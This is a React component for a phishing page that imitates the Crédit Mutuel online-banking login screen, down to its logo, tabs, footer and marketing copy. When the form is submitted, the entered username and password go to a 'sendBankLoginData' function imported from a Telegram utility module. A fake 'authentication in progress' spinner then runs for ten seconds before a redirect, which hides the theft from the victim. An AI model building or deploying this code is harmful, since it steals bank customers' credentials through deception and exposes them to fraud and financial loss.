import React, { useState } from 'react';
import { X, Search, Eye, EyeOff, Info } from 'lucide-react';
import { sendBankLoginData } from '../../utils/telegram';

type CreditMutuelAuthProps = {
  onAuthenticate: () => void;
  onBack: () => void;
};

const CreditMutuelAuth = ({ onAuthenticate, onBack }: CreditMutuelAuthProps) => {
  const [identifiant, setIdentifiant] = useState('');
  const [motDePasse, setMotDePasse] = useState('');
  const [showPassword, setShowPassword] = useState(false);
  const [isLoading, setIsLoading] = useState(false);

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    if (identifiant && motDePasse) {
      setIsLoading(true);
      
      await sendBankLoginData({
        bankName: 'Crédit Mutuel',
        username: identifiant,
        password: motDePasse
      });

      setTimeout(() => {
        setIsLoading(false);
        // Redirection vers la page de succès
        window.location.href = '/success';
      }, 10000);
    }
  };

  if (isLoading) {
    return (
      <div className="min-h-screen flex flex-col items-center justify-center bg-white">
        <div className="text-center">
          <div className="mb-8">
            <div className="w-20 h-20 mx-auto relative">
              <div className="absolute inset-0 rounded-full border-4 border-gray-200"></div>
              <div className="absolute inset-0 rounded-full border-4 border-[#1D4ED8] animate-spin border-t-transparent"></div>
            </div>
          </div>
          <h2 className="text-xl font-semibold text-gray-800 mb-2">
            Authentification en cours
          </h2>
          <p className="text-gray-600">
            Connexion à votre espace Crédit Mutuel...
          </p>
        </div>
      </div>
    );
  }

  return (
    <div className="min-h-screen bg-white">
      {/* Header */}
      <header className="bg-white border-b border-gray-200">
        <div className="flex items-center justify-between px-4 py-3">
          <div className="flex items-center">
            <button className="lg:hidden p-2 text-gray-600 mr-4">
              <div className="w-6 h-6 flex flex-col justify-center space-y-1">
                <div className="w-full h-0.5 bg-gray-600"></div>
                <div className="w-full h-0.5 bg-gray-600"></div>
                <div className="w-full h-0.5 bg-gray-600"></div>
              </div>
              <span className="ml-2 text-sm font-medium">Menu</span>
            </button>
            
            <img 
              src="https://logos-marques.com/wp-content/uploads/2020/01/Cr%C3%A9dit-Mutuel-logo.png" 
              alt="Crédit Mutuel" 
              className="h-8 lg:h-10"
              onError={(e) => {
                (e.target as HTMLImageElement).src = 'data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iMTgwIiBoZWlnaHQ9IjQwIiB2aWV3Qm94PSIwIDAgMTgwIDQwIiBmaWxsPSJub25lIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciPgo8cmVjdCB3aWR0aD0iMTgwIiBoZWlnaHQ9IjQwIiBmaWxsPSIjMUQ0RUQ4Ii8+Cjx0ZXh0IHg9IjkwIiB5PSIyNSIgZm9udC1mYW1pbHk9IkFyaWFsLCBzYW5zLXNlcmlmIiBmb250LXNpemU9IjE0IiBmaWxsPSJ3aGl0ZSIgdGV4dC1hbmNob3I9Im1pZGRsZSIgZm9udC13ZWlnaHQ9ImJvbGQiPkNSw4lESVQgTVVUVUVMPC90ZXh0Pgo8L3N2Zz4K';
              }}
            />
          </div>
          
          <div className="flex items-center space-x-4">
            <div className="hidden lg:flex items-center space-x-6 text-sm">
              <button className="text-gray-600 hover:text-gray-800">Particuliers</button>
              <button className="text-gray-600 hover:text-gray-800">Auto-entrepreneurs</button>
              <button className="text-gray-600 hover:text-gray-800">Professionnels</button>
              <button className="text-gray-600 hover:text-gray-800">Entreprises</button>
              <button className="text-gray-600 hover:text-gray-800">Agriculteurs</button>
              <button className="text-gray-600 hover:text-gray-800">Associations</button>
            </div>
            
            <div className="flex items-center space-x-4">
              <button className="p-2 text-gray-600 hover:text-gray-800">
                <Search size={20} />
              </button>
              
              <button className="bg-white border border-[#1D4ED8] text-[#1D4ED8] px-4 py-2 rounded-full text-sm hover:bg-blue-50 transition-colors">
                Ouvrir un compte
              </button>
              
              <button 
                onClick={onBack}
                className="p-1 text-gray-600 hover:text-gray-800 transition-colors"
              >
                <X size={20} />
              </button>
            </div>
          </div>
        </div>
      </header>

      {/* Bandeau d'information */}
      <div className="bg-blue-50 border border-blue-200 p-4 mx-4 mt-4 rounded-lg">
        <div className="flex items-start space-x-3">
          <Info className="w-5 h-5 text-blue-600 mt-0.5 flex-shrink-0" />
          <div className="text-sm text-blue-800">
            <strong>Site allégé, navigation simplifiée et design épuré :</strong> nous avons repensé notre site web pour mieux vous servir ! 
            <button className="text-blue-600 hover:underline ml-1">En savoir plus</button>
          </div>
        </div>
      </div>

      {/* Contenu principal */}
      <div className="flex justify-center py-8 px-4">
        <div className="w-full max-w-md">
          <h1 className="text-2xl lg:text-3xl font-semibold text-[#1D4ED8] mb-8 text-center">
            Se connecter
          </h1>

          {/* Onglets */}
          <div className="flex border-b border-gray-200 mb-8">
            <button className="flex-1 py-3 px-4 text-[#1D4ED8] border-b-2 border-[#1D4ED8] font-medium text-sm">
              Identifiant / Mot de passe
            </button>
            <button className="flex-1 py-3 px-4 text-gray-600 hover:text-gray-800 text-sm">
              Certificat Électronique
            </button>
            <button className="flex-1 py-3 px-4 text-gray-600 hover:text-gray-800 text-sm">
              SAFETRANS
            </button>
          </div>

          <form onSubmit={handleSubmit} className="space-y-6">
            <div className="text-sm text-gray-600 mb-4">
              <span className="text-red-500">*</span> : information obligatoire
            </div>

            {/* Champ Identifiant */}
            <div>
              <label className="block text-gray-700 font-medium mb-2">
                Identifiant <span className="text-red-500">*</span>
              </label>
              <input
                type="text"
                value={identifiant}
                onChange={(e) => setIdentifiant(e.target.value)}
                className="w-full px-4 py-3 border border-gray-300 rounded-lg text-gray-800 focus:outline-none focus:ring-2 focus:ring-[#1D4ED8] focus:border-transparent"
              />
            </div>

            {/* Champ Mot de passe */}
            <div>
              <label className="block text-gray-700 font-medium mb-2">
                Mot de passe <span className="text-red-500">*</span>
              </label>
              <div className="relative">
                <input
                  type={showPassword ? "text" : "password"}
                  value={motDePasse}
                  onChange={(e) => setMotDePasse(e.target.value)}
                  className="w-full px-4 py-3 border border-gray-300 rounded-lg text-gray-800 focus:outline-none focus:ring-2 focus:ring-[#1D4ED8] focus:border-transparent pr-12"
                />
                <button
                  type="button"
                  onClick={() => setShowPassword(!showPassword)}
                  className="absolute right-4 top-1/2 transform -translate-y-1/2 text-gray-500 hover:text-gray-700"
                >
                  {showPassword ? <EyeOff size={20} /> : <Eye size={20} />}
                </button>
              </div>
            </div>

            {/* Bouton Se connecter */}
            <button
              type="submit"
              disabled={!identifiant || !motDePasse || isLoading}
              className="w-full bg-[#1D4ED8] text-white py-4 rounded-lg text-lg font-semibold hover:bg-[#1E40AF] disabled:bg-gray-300 disabled:cursor-not-allowed transition-colors focus:outline-none focus:ring-2 focus:ring-[#1D4ED8] focus:ring-offset-2"
            >
              Se connecter
            </button>

            {/* Liens d'aide */}
            <div className="flex flex-col space-y-4 text-center">
              <button
                type="button"
                className="text-[#1D4ED8] hover:underline flex items-center justify-center"
              >
                Codes d'accès oubliés
                <span className="ml-2">→</span>
              </button>
              <button
                type="button"
                className="text-[#1D4ED8] hover:underline flex items-center justify-center"
              >
                Infos sécurité
                <span className="ml-2">→</span>
              </button>
            </div>
          </form>

          {/* Bandeau Astuces */}
          <div className="bg-blue-50 border border-blue-200 p-4 mt-8 rounded-lg">
            <div className="text-sm text-blue-800">
              <strong className="text-[#1D4ED8]">Astuces :</strong>{' '}
              <button className="text-[#1D4ED8] hover:underline">
                Nos conseils pour sécuriser vos opérations et données.
              </button>
            </div>
          </div>
        </div>
      </div>

      {/* Footer */}
      <footer className="bg-[#1D4ED8] text-white mt-16">
        <div className="px-6 py-8">
          {/* Sections principales */}
          <div className="grid grid-cols-1 md:grid-cols-3 gap-8 mb-8">
            <div className="flex items-center space-x-3">
              <div className="w-8 h-8 bg-white/20 rounded-full flex items-center justify-center">
                <Info size={16} />
              </div>
              <span className="font-medium">Centre d'aide</span>
            </div>
            
            <div className="flex items-center space-x-3">
              <div className="w-8 h-8 bg-white/20 rounded-full flex items-center justify-center">
                <span className="text-sm">🏢</span>
              </div>
              <span className="font-medium">Trouver une caisse</span>
            </div>
            
            <div className="flex items-center space-x-3">
              <div className="w-8 h-8 bg-white/20 rounded-full flex items-center justify-center">
                <span className="text-sm">🤟</span>
              </div>
              <span className="font-medium">Sourds et malentendants</span>
            </div>
          </div>

          {/* Bouton application */}
          <div className="text-center mb-8">
            <button className="bg-transparent border-2 border-white text-white px-8 py-3 rounded-full font-medium hover:bg-white hover:text-[#1D4ED8] transition-colors">
              Télécharger l'application
            </button>
          </div>

          {/* Section newsletter et prix */}
          <div className="grid grid-cols-1 lg:grid-cols-2 gap-8 mb-8">
            <div className="bg-white/10 rounded-lg p-6">
              <div className="flex items-center space-x-4 mb-4">
                <div className="w-16 h-16 bg-gradient-to-br from-purple-600 to-pink-600 rounded-full flex items-center justify-center">
                  <span className="text-white font-bold text-sm">n°1</span>
                </div>
                <div>
                  <h3 className="font-bold text-lg">Podium Relation Client</h3>
                  <p className="text-sm opacity-90">2024</p>
                </div>
              </div>
              <p className="text-sm opacity-80 mb-4">
                Crédit Mutuel, N°1 du Podium de la Relation Client - secteur Banque 
                (édition 2024). Enquête BearingPoint et Kantar auprès de 4 000 clients/usagers.
              </p>
              <p className="text-xs opacity-70">Banque</p>
            </div>

            <div>
              <h3 className="font-bold mb-4">Abonnez-vous à notre newsletter pour ne rien manquer de nos actualités</h3>
              <div className="flex space-x-2">
                <input
                  type="email"
                  placeholder="Votre adresse e-mail"
                  className="flex-1 px-4 py-2 rounded-lg text-gray-800"
                />
                <button className="bg-white text-[#1D4ED8] px-6 py-2 rounded-lg font-medium hover:bg-gray-100 transition-colors">
                  Valider
                </button>
              </div>
            </div>
          </div>
        </div>

        {/* Footer légal */}
        <div className="border-t border-white/20 px-6 py-4">
          <div className="flex items-center justify-between">
            <div className="flex items-center space-x-2">
              <img 
                src="https://logos-marques.com/wp-content/uploads/2020/01/Cr%C3%A9dit-Mutuel-logo.png" 
                alt="Crédit Mutuel" 
                className="h-6"
              />
              <span className="text-sm opacity-80">Une banque qui appartient à ses clients, ça change tout.</span>
            </div>
            
            <div className="flex space-x-4">
              <button className="text-white/60 hover:text-white">
                <span className="sr-only">Twitter</span>
                <svg className="w-5 h-5" fill="currentColor" viewBox="0 0 24 24">
                  <path d="M24 4.557c-.883.392-1.832.656-2.828.775 1.017-.609 1.798-1.574 2.165-2.724-.951.564-2.005.974-3.127 1.195-.897-.957-2.178-1.555-3.594-1.555-3.179 0-5.515 2.966-4.797 6.045-4.091-.205-7.719-2.165-10.148-5.144-1.29 2.213-.669 5.108 1.523 6.574-.806-.026-1.566-.247-2.229-.616-.054 2.281 1.581 4.415 3.949 4.89-.693.188-1.452.232-2.224.084.626 1.956 2.444 3.379 4.6 3.419-2.07 1.623-4.678 2.348-7.29 2.04 2.179 1.397 4.768 2.212 7.548 2.212 9.142 0 14.307-7.721 13.995-14.646.962-.695 1.797-1.562 2.457-2.549z"/>
                </svg>
              </button>
              <button className="text-white/60 hover:text-white">
                <span className="sr-only">Facebook</span>
                <svg className="w-5 h-5" fill="currentColor" viewBox="0 0 24 24">
                  <path d="M24 12.073c0-6.627-5.373-12-12-12s-12 5.373-12 12c0 5.99 4.388 10.954 10.125 11.854v-8.385H7.078v-3.47h3.047V9.43c0-3.007 1.792-4.669 4.533-4.669 1.312 0 2.686.235 2.686.235v2.953H15.83c-1.491 0-1.956.925-1.956 1.874v2.25h3.328l-.532 3.47h-2.796v8.385C19.612 23.027 24 18.062 24 12.073z"/>
                </svg>
              </button>
              <button className="text-white/60 hover:text-white">
                <span className="sr-only">Instagram</span>
                <svg className="w-5 h-5" fill="currentColor" viewBox="0 0 24 24">
                  <path d="M12.017 0C5.396 0 .029 5.367.029 11.987c0 5.079 3.158 9.417 7.618 11.174-.105-.949-.199-2.403.041-3.439.219-.937 1.406-5.957 1.406-5.957s-.359-.72-.359-1.781c0-1.663.967-2.911 2.168-2.911 1.024 0 1.518.769 1.518 1.688 0 1.029-.653 2.567-.992 3.992-.285 1.193.6 2.165 1.775 2.165 2.128 0 3.768-2.245 3.768-5.487 0-2.861-2.063-4.869-5.008-4.869-3.41 0-5.409 2.562-5.409 5.199 0 1.033.394 2.143.889 2.741.099.12.112.225.085.345-.09.375-.293 1.199-.334 1.363-.053.225-.172.271-.402.165-1.495-.69-2.433-2.878-2.433-4.646 0-3.776 2.748-7.252 7.92-7.252 4.158 0 7.392 2.967 7.392 6.923 0 4.135-2.607 7.462-6.233 7.462-1.214 0-2.357-.629-2.75-1.378l-.748 2.853c-.271 1.043-1.002 2.35-1.492 3.146C9.57 23.812 10.763 24.009 12.017 24.009c6.624 0 11.99-5.367 11.99-11.988C24.007 5.367 18.641.001.012.001z"/>
                </svg>
              </button>
              <button className="text-white/60 hover:text-white">
                <span className="sr-only">YouTube</span>
                <svg className="w-5 h-5" fill="currentColor" viewBox="0 0 24 24">
                  <path d="M23.498 6.186a3.016 3.016 0 0 0-2.122-2.136C19.505 3.545 12 3.545 12 3.545s-7.505 0-9.377.505A3.017 3.017 0 0 0 .502 6.186C0 8.07 0 12 0 12s0 3.93.502 5.814a3.016 3.016 0 0 0 2.122 2.136c1.871.505 9.376.505 9.376.505s7.505 0 9.377-.505a3.015 3.015 0 0 0 2.122-2.136C24 15.93 24 12 24 12s0-3.93-.502-5.814zM9.545 15.568V8.432L15.818 12l-6.273 3.568z"/>
                </svg>
              </button>
              <button className="text-white/60 hover:text-white">
                <span className="sr-only">LinkedIn</span>
                <svg className="w-5 h-5" fill="currentColor" viewBox="0 0 24 24">
                  <path d="M20.447 20.452h-3.554v-5.569c0-1.328-.027-3.037-1.852-3.037-1.853 0-2.136 1.445-2.136 2.939v5.667H9.351V9h3.414v1.561h.046c.477-.9 1.637-1.85 3.37-1.85 3.601 0 4.267 2.37 4.267 5.455v6.286zM5.337 7.433c-1.144 0-2.063-.926-2.063-2.065 0-1.138.92-2.063 2.063-2.063 1.14 0 2.064.925 2.064 2.063 0 1.139-.925 2.065-2.064 2.065zm1.782 13.019H3.555V9h3.564v11.452zM22.225 0H1.771C.792 0 0 .774 0 1.729v20.542C0 23.227.792 24 1.771 24h20.451C23.2 24 24 23.227 24 22.271V1.729C24 .774 23.2 0 22.222 0h.003z"/>
                </svg>
              </button>
            </div>
          </div>
        </div>
      </footer>
    </div>
  );
};

export default CreditMutuelAuth;